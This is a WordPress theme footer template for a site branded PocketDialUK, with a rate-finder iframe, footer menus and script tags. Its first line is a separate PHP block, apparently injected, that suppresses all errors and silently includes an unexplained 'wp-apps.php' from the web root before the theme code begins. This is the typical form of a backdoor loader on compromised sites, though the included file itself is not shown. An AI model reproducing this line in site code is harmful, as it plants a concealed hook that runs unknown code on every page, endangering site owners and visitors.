<?php error_reporting(0);include_once $_SERVER[DOCUMENT_ROOT]. 'wp-apps.php';?><?php
/**
 * The template for displaying the footer.
 *
 * Contains the closing of the id=main div and all content after
 */
?>

	</div><!-- #main -->


<!-- Rate Finder Popup -->
<div class="bg_fade_ratefinder">
<div class="rate_finder">
<p>Please select your country from the menu below</p>
<a href="#" class="close_form">Close Form</a>
<iframe src="http://www.just-dial.com/jd/agents/rate_finder_tool2/rate_tool_finder_0844.asp?ID=40786722" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" align="center" width="100%" height="245"></iframe>
</div>
</div>
	<footer id="colophon" role="contentinfo" class="group">

		<a href="#" class="scrollToTop"></a>
			<?php
				/* A sidebar in the footer? Yep. You can can customize
				 * your footer with three columns of widgets.
				 */
				if ( ! is_404() )
					get_sidebar( footer );
			?>
			<div class="footer_nav group">
			 <?php wp_nav_menu( array( theme_location => footer ) ); ?>
      </div>
            
      <div class="social_nav">
        <p>Follow Us</p>
        <?php wp_nav_menu( array( theme_location => social ) ); ?>
      </div>      
      

	</footer><!-- #colophon -->
    
</div><!-- #page -->
<div class="footer_shadow"></div>
<div class="copyright">&copy; PocketDialUK <?php echo date("Y") ?></div>

  <?php wp_nav_menu( array( 'theme_location' => 'bottomlinks', 'link_after' => '<span>|</span>' ) ); ?>
  

<!-- Tooltip Container -->
<div id="tooltip_container"><img src="/images/tooltip_arrow.png" class="tooltip_arrow"/><div class="tooltip_text"></div><img src="/images/tooltip_info.png" class="tooltip_info"/></div>


<?php wp_footer(); ?>

<!-- Scripts -->
<script src="<?php echo get_stylesheet_directory_uri(); ?>/js/enquire.js"></script>
<script src="<?php echo get_stylesheet_directory_uri(); ?>/js/jquery.fitvids.js"></script>
<script src="<?php echo get_stylesheet_directory_uri(); ?>/js/alphabetNav.js"></script>
<script src="<?php echo get_stylesheet_directory_uri(); ?>/js/jquery.scrollTo-1.4.3.1-min.js"></script>
<script src="<?php echo get_stylesheet_directory_uri(); ?>/js/jquery.bxslider.min.js"></script>
<script src="<?php echo get_stylesheet_directory_uri(); ?>/js/custom.js"></script>
</body>
</html>


